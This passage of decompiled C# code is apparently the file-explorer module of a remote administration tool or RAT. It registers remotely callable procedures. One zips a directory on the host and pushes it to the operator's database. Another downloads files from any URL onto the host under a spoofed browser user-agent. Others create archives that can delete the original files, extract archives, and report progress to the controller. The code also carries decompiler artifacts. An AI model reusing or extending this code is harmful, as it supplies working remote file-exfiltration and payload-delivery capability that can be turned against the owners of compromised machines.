					//IL_000b: Unknown result type (might be due to invalid IL or missing references)
					FileInfo fileInfo2 = new FileInfo(FileExtensions.GetFreeTempFileName());
					new FastZip().CreateZip(fileInfo2.FullName, directoryInfo.FullName, true, (string)null);
					_connectionInfo.get_ClientInfo().get_ClientOperator().get_DatabaseConnection()
						.PushFile(fileInfo2.FullName, directoryInfo.Name, DataMode.get_ZipArchive());
					fileInfo2.Delete();
				}).Start();
			}
			return (object)(DownloadResult)0;
		}, new Type[0]);
		DtpProcessor dtpProcessor14 = _dtpProcessor;
		object obj14 = _003C_003Ec._003C_003E9__13_28;
		if (obj14 == null)
		{
			DtpFunction val14 = delegate(DtpParameters parameters)
			{
				string string2 = parameters.GetString(0);
				Bitmap val18 = (parameters.GetBool(1) ? WindowsThumbnailProvider.GetThumbnail(string2, 300, 169, ThumbnailOptions.BiggerSizeOk) : WindowsThumbnailProvider.GetThumbnail(string2, 100, 56, ThumbnailOptions.None));
				using MemoryStream memoryStream = new MemoryStream();
				((Image)val18).Save((Stream)memoryStream, ImageFormat.get_Png());
				return memoryStream.ToArray();
			};
			obj14 = (object)val14;
			_003C_003Ec._003C_003E9__13_28 = val14;
		}
		dtpProcessor14.RegisterFunction("GetFileThumbnail", (DtpFunction)obj14, new Type[0]);
		_dtpProcessor.RegisterProcedure("CreateArchive", (DtpProcedure)delegate(DtpParameters parameters)
		{
			//IL_001b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0020: Unknown result type (might be due to invalid IL or missing references)
			//IL_0027: Unknown result type (might be due to invalid IL or missing references)
			//IL_0032: Unknown result type (might be due to invalid IL or missing references)
			//IL_0039: Unknown result type (might be due to invalid IL or missing references)
			//IL_0044: Unknown result type (might be due to invalid IL or missing references)
			//IL_005a: Unknown result type (might be due to invalid IL or missing references)
			//IL_006b: Unknown result type (might be due to invalid IL or missing references)
			//IL_007a: Unknown result type (might be due to invalid IL or missing references)
			//IL_008a: Expected O, but got Unknown
			ArchiveOptions archiveOptions = parameters.GetValue<ArchiveOptions>(0);
			ProcessingEntry val17 = new ProcessingEntry();
			val17.set_Action((ProcessingEntryAction)0);
			val17.set_CreationTime(DateTime.UtcNow);
			val17.set_IsInterminate(true);
			val17.set_LastAccess(DateTime.UtcNow);
			val17.set_Name(Path.GetFileName(archiveOptions.get_ArchivePath()));
			val17.set_Path(archiveOptions.get_ArchivePath());
			val17.set_Size(0L);
			val17.set_Progress(0f);
			ProcessingEntry processingEntry3 = val17;
			string normalizedFolderPath2 = FileExtensions.NormalizePath(Path.GetDirectoryName(archiveOptions.get_ArchivePath()));
			string normalizedPath2 = FileExtensions.NormalizePath(archiveOptions.get_ArchivePath());
			CancellationTokenEx cancellationToken2 = new CancellationTokenEx();
			lock (ProcessingEntriesLock)
			{
				if (ProcessingEntries.TryGetValue(normalizedFolderPath2, out var value7))
				{
					value7.Add(processingEntry3);
				}
				else
				{
					ProcessingEntries.Add(normalizedFolderPath2, new List<ProcessingEntry> { processingEntry3 });
				}
				ProcessEntryCancellationTokens.Add(normalizedPath2, cancellationToken2);
			}
			FileExplorerCommand.ProcessingEntriesChanged?.Invoke(this, new ProcessingEntriesChangedEventArgs(normalizedFolderPath2, processingEntry3, EntryUpdateMode.Add));
			new Thread((ThreadStart)delegate
			{
				try
				{
					ZipUtilities.CreateArchive(archiveOptions, processingEntry3, cancellationToken2, delegate
					{
						FileExplorerCommand.ProcessingEntriesChanged?.Invoke(this, new ProcessingEntriesChangedEventArgs(normalizedFolderPath2, processingEntry3, EntryUpdateMode.Update));
					});
				}
				catch (Exception)
				{
					cancellationToken2.Cancel();
				}
				finally
				{
					lock (ProcessingEntriesLock)
					{
						if (ProcessingEntries.TryGetValue(normalizedFolderPath2, out var value8))
						{
							value8.Remove(processingEntry3);
							if (value8.Count == 0)
							{
								ProcessingEntries.Remove(normalizedFolderPath2);
							}
						}
						ProcessEntryCancellationTokens.Remove(normalizedPath2);
					}
				}
				if (cancellationToken2.IsCanceled)
				{
					try
					{
						File.Delete(archiveOptions.get_ArchivePath());
						return;
					}
					catch (Exception)
					{
						return;
					}
				}
				if (archiveOptions.get_DeleteAfterArchiving())
				{
					foreach (EntryInfo entry in archiveOptions.get_Entries())
					{
						try
						{
							if (entry.get_IsDirectory())
							{
								Directory.Delete(entry.get_Path(), recursive: true);
							}
							else
							{
								File.Delete(entry.get_Path());
							}
						}
						catch (Exception)
						{
						}
					}
				}
			}).Start();
		});
		_dtpProcessor.RegisterProcedure("DownloadFileFromUrl", (DtpProcedure)delegate(DtpParameters parameters)
		{
			//IL_0023: Unknown result type (might be due to invalid IL or missing references)
			//IL_0028: Unknown result type (might be due to invalid IL or missing references)
			//IL_002f: Unknown result type (might be due to invalid IL or missing references)
			//IL_003a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0041: Unknown result type (might be due to invalid IL or missing references)
			//IL_004c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0058: Unknown result type (might be due to invalid IL or missing references)
			//IL_005f: Unknown result type (might be due to invalid IL or missing references)
			//IL_006e: Unknown result type (might be due to invalid IL or missing references)
			//IL_007e: Expected O, but got Unknown
			string @string = parameters.GetString(0);
			Uri address = new Uri(parameters.GetString(1));
			ProcessingEntry val16 = new ProcessingEntry();
			val16.set_Action((ProcessingEntryAction)2);
			val16.set_CreationTime(DateTime.UtcNow);
			val16.set_IsInterminate(false);
			val16.set_LastAccess(DateTime.UtcNow);
			val16.set_Name(Path.GetFileName(@string));
			val16.set_Path(@string);
			val16.set_Size(0L);
			val16.set_Progress(0f);
			ProcessingEntry processingEntry2 = val16;
			string normalizedFolderPath = FileExtensions.NormalizePath(Path.GetDirectoryName(@string));
			string normalizedPath = FileExtensions.NormalizePath(@string);
			WebClient webClient = new WebClient();
			webClient.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36");
			CancellationTokenEx value4 = new CancellationTokenEx(delegate
			{
				webClient.CancelAsync();
			});
			lock (ProcessingEntriesLock)
			{
				if (ProcessingEntries.TryGetValue(normalizedFolderPath, out var value5))
				{
					value5.Add(processingEntry2);
				}
				else
				{
					ProcessingEntries.Add(normalizedFolderPath, new List<ProcessingEntry> { processingEntry2 });
				}
				ProcessEntryCancellationTokens.Add(normalizedPath, value4);
			}
			FileExplorerCommand.ProcessingEntriesChanged?.Invoke(this, new ProcessingEntriesChangedEventArgs(normalizedFolderPath, processingEntry2, EntryUpdateMode.Add));
			Stopwatch stopwatch = Stopwatch.StartNew();
			webClient.DownloadProgressChanged += delegate(object sender, DownloadProgressChangedEventArgs e)
			{
				if (stopwatch.ElapsedMilliseconds > 1000L)
				{
					stopwatch.Reset();
					processingEntry2.set_Size(e.BytesReceived);
					processingEntry2.set_Progress((float)e.ProgressPercentage / 100f);
					FileExplorerCommand.ProcessingEntriesChanged?.Invoke(this, new ProcessingEntriesChangedEventArgs(normalizedFolderPath, processingEntry2, EntryUpdateMode.Update));
					stopwatch.Start();
				}
			};
			webClient.DownloadFileCompleted += delegate(object sender, AsyncCompletedEventArgs e)
			{
				if (!e.Cancelled && e.Error == null)
				{
					processingEntry2.set_Progress(1f);
				}
				else
				{
					processingEntry2.set_Size(0L);
					processingEntry2.set_Progress(-1f);
				}
				FileExplorerCommand.ProcessingEntriesChanged?.Invoke(this, new ProcessingEntriesChangedEventArgs(normalizedFolderPath, processingEntry2, EntryUpdateMode.Update));
				lock (ProcessingEntriesLock)
				{
					if (ProcessingEntries.TryGetValue(normalizedFolderPath, out var value6))
					{
						value6.Remove(processingEntry2);
						if (value6.Count == 0)
						{
							ProcessingEntries.Remove(normalizedFolderPath);
						}
					}
					ProcessEntryCancellationTokens.Remove(normalizedPath);
				}
			};
			webClient.DownloadFileAsync(address, @string);
		});
		DtpProcessor dtpProcessor15 = _dtpProcessor;
		object obj15 = _003C_003Ec._003C_003E9__13_36;
		if (obj15 == null)
		{
			DtpProcedure val15 = delegate(DtpParameters parameters)
			{
				string key4 = FileExtensions.NormalizePath(parameters.GetString(0));
				lock (ProcessingEntriesLock)
				{
					if (ProcessEntryCancellationTokens.TryGetValue(key4, out var value3))
					{
						value3.Cancel();
					}
				}
			};
			obj15 = (object)val15;
			_003C_003Ec._003C_003E9__13_36 = val15;
		}
		dtpProcessor15.RegisterProcedure("CancelProcessingEntry", (DtpProcedure)obj15);
		_dtpProcessor.RegisterProcedure("ExtractArchive", (DtpProcedure)delegate(DtpParameters parameters)
		{
			string filePath = parameters.GetString(0);
			string destinationDirectory = parameters.GetString(1);
			CancellationTokenEx cancellationToken = new CancellationTokenEx();
			List<ProcessingEntry> addedEntries = new List<ProcessingEntry>();
			new Thread((ThreadStart)delegate
			{
				try
				{
					ZipUtilities.ExtractArchive(filePath, destinationDirectory, cancellationToken, delegate(ProcessingEntry entry)
					{
						FileExplorerCommand.ProcessingEntriesChanged?.Invoke(this, new ProcessingEntriesChangedEventArgs(FileExtensions.NormalizePath(Path.GetDirectoryName(entry.get_Path())), entry, EntryUpdateMode.Update));
						if (entry.get_Progress() == 1f || entry.get_Progress() == -1f)
						{
							RemoveProcessingEntry13_3(entry);
							addedEntries.Remove(entry);
						}
						static void RemoveProcessingEntry13_3(ProcessingEntry processingEntry)
						{
							string key2 = FileExtensions.NormalizePath(Path.GetDirectoryName(processingEntry.get_Path()));
							string key3 = FileExtensions.NormalizePath(processingEntry.get_Path());
							lock (ProcessingEntriesLock)
							{
								if (ProcessingEntries.TryGetValue(key2, out var value2))
								{
									value2.Remove(processingEntry);
									if (value2.Count == 0)
									{
										ProcessingEntries.Remove(key2);
									}
								}
								ProcessEntryCancellationTokens.Remove(key3);
							}
						}
					}, delegate(ProcessingEntry entry)
					{
						string text = FileExtensions.NormalizePath(Path.GetDirectoryName(entry.get_Path()));
						string key = FileExtensions.NormalizePath(entry.get_Path());
						lock (ProcessingEntriesLock)
						{
							if (ProcessingEntries.TryGetValue(text, out var value))
							{
								value.Add(entry);
							}
							else
							{
								ProcessingEntries.Add(text, new List<ProcessingEntry> { entry });
							}
							ProcessEntryCancellationTokens.Add(key, cancellationToken);
						}
						addedEntries.Add(entry);
						FileExplorerCommand.ProcessingEntriesChanged?.Invoke(this, new ProcessingEntriesChangedEventArgs(text, entry, EntryUpdateMode.Add));
					});
				}
				catch (Exception)
				{
				}
				finally
				{
					foreach (ProcessingEntry item3 in addedEntries)
					{
						FileExplorerCommand._003C_002Ector_003Eg__RemoveProcessingEntry13_38(item3);
					}
				}
			}).Start();
		});
	}

	private void OnProcessingEntriesChanged(object sender, ProcessingEntriesChangedEventArgs e)
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		if (_connectionInfo == null || _isDisposed)
		{
			return;
		}
		try
		{
			switch (e.EntryUpdateMode)
			{
			default:
				throw new ArgumentOutOfRangeException();
			case EntryUpdateMode.Update:
			{
				ProcessingEntryUpdate val = new ProcessingEntryUpdate();
				val.set_Path(e.ProcessingEntry.get_Path());
				val.set_Progress(e.ProcessingEntry.get_Progress());
				val.set_Size(e.ProcessingEntry.get_Size());
				ProcessingEntryUpdate val2 = val;
				((Command)this).ResponseBytes((byte)7, _processingEntryUpdateSerializer.Value.Serialize((object)val2), _connectionInfo);
				break;
			}
			case EntryUpdateMode.Add:
				((Command)this).ResponseBytes((byte)8, _processingEntrySerializer.Value.Serialize((object)e.ProcessingEntry), _connectionInfo);
				break;
			}
		}
		catch (Exception)
		{
		}
	}

	public override void Dispose()
	{
		((Command)this).Dispose();
		ProcessingEntriesChanged -= OnProcessingEntriesChanged;
		_isDisposed = true;
		_uploadService.Dispose();
	}

	private static string ObjectToString(object obj)
	{
		if (obj is ICollection)
		{
			return string.Join(", ", (from object x in (ICollection)obj
				select x?.ToString()).ToArray());
		}
		return obj?.ToString();
	}

	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Invalid comparison between Unknown and I4
		FileExplorerCommunication val = (FileExplorerCommunication)parameter[0];
		if ((int)val != 0)
		{
			if ((int)val != 2)
			{
				throw new ArgumentOutOfRangeException();
			}
			Guid guid = new Guid(parameter.Skip(1).Take(16).ToArray());
			_uploadService.ReceivePackage(guid, parameter, 17);
		}
		else
		{
			_connectionInfo = connectionInfo;
			byte[] array = _dtpProcessor.Receive(parameter, 1);
			byte[] array2 = new byte[array.Length + 1];
			array2[0] = 1;
			Array.Copy(array, 0, array2, 1, array.Length);
			connectionInfo.CommandResponse((Command)(object)this, array2, (PackageCompression)2);
		}
	}

	protected override uint GetId()
	{
		return 7u;
	}
}
